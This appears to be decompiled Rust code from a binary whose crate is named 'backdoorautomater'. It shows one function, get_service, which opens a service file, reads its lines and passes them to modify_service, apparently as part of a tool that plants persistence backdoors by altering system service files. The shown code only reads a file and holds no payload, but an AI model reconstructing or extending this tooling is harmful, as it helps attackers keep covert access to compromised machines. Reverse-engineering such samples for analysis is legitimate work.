
  fn backdoorautomater::modifyservice::get_service::h8cd53f8d8d7b2c85(arg1: *mut i64, arg2: *mut i64, arg3: i8, arg4: *mut i64, arg5: *mut i64) -> i64

{
    let rax: i64 = arg2[1];
    let result_2: i64 = arg2[2] + rax;
    let mut var_198: i64 = rax;
    let rax_1: i32 = _$LT$core..str..iter..Chars$u20$as$u20$core..iter..traits..double_ended..DoubleEndedIterator$GT$::next_back::h6ef03064f47cabe8(&var_198);
    
    if rax_1 != 0x2f && rax_1 != 0x110000
    {
        alloc::string::String::push::h8dfcd488d6c0f12b(arg2);
    }
    
    let mut var_108: i128;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(
        &var_108, arg1);
    let mut var_78: i128;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_78, 
        arg2);
    let var_f8: i64;
    let var_170: i64 = var_f8;
    let mut var_180: i128 = var_108;
    var_198 = var_78;
    let var_68: i64;
    let mut var_188: i64 = var_68;
    let mut var_158: i128;
    alloc::str::join_generic_copy::h6e3e6eb2fb0da332(&var_158, &var_198, 2, 1, 0);
    let var_148: i64;
    let var_118: i64 = var_148;
    let mut var_128: i128 = var_158;
    core::ptr::drop_in_place$LT$$u5b$alloc..string..String$u3b$$u20$2$u5d$$GT$::hfd07afc6d277b85d(
        &var_198);
    std::fs::File::open::hc9cc0415293bf7f9(&var_198, &var_128);
    let mut result: i64;
    
    if var_198 == 0
    {
        let mut var_60: i128;
        std::io::buffered::bufreader::BufReader$LT$R$GT$::with_capacity::hfc22a243c8e8e3e1(&var_60, 
            0x2000, *var_198[4]);
        let mut var_140: i64 = 0;
        let var_138_1: i64 = 8;
        let var_130_1: i64 = 0;
        let var_40: i128;
        var_180 = var_40;
        let var_50: i128;
        var_188 = var_50;
        var_198 = var_60;
        
        loop
        {
            _$LT$std..io..Lines$LT$B$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h114c8ea989dd5339(&var_158, &var_198);
            let rax_5: i64 = var_158;
            
            if rax_5 == -0x7fffffffffffffff
            {
                core::ptr::drop_in_place$LT$std..io..Lines$LT$std..io..buffered..bufreader..BufReader$LT$std..fs..File$GT$$GT$$GT$::hdb5dfe103db56fee(&var_198);
                let var_c8_1: i64 = arg1[2];
                let mut var_d8: i128 = *arg1;
                let var_a8_1: i64 = arg2[2];
                let mut var_b8: i128 = *arg2;
                let var_88_1: i64 = var_130_1;
                let mut var_98: i128 = var_140;
                let var_148_1: i64 = arg4[2];
                var_158 = *arg4;
                let var_188_1: i64 = arg5[2];
                var_198 = *arg5;
                backdoorautomater::modifyservice::modify_service::h70e6f10bf69e7eca(&var_d8, 
                    &var_b8, arg3, &var_98, &var_158, &var_198);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_128);
                return 0;
            }
            
            result = *var_158[8];
            
            if rax_5 == -0x8000000000000000
            {
                break;
            }
            
            let mut var_f0: i64 = rax_5;
            let result_1: i64 = result;
            let var_e0_1: i64 = var_148;
            alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_140, &var_f0);
        }
        
        core::ptr::drop_in_place$LT$std..io..Lines$LT$std..io..buffered..bufreader..BufReader$LT$std..fs..File$GT$$GT$$GT$::hdb5dfe103db56fee(&var_198);
        core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$::h8814db29c860c5cd(&var_140);
    }
    else
    {
        result = result_2;
    }
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_128);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg5);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg4);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    result
}
